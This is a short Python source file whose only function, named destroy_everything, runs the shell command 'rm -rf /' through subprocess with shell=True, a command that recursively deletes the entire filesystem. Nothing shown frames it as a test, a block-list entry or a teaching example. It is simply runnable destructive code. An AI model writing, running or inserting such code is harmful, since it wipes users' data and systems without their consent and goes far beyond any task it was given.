import subprocess


def destroy_everything() -> None:
    subprocess.run("rm -rf /", shell=True, check=False)
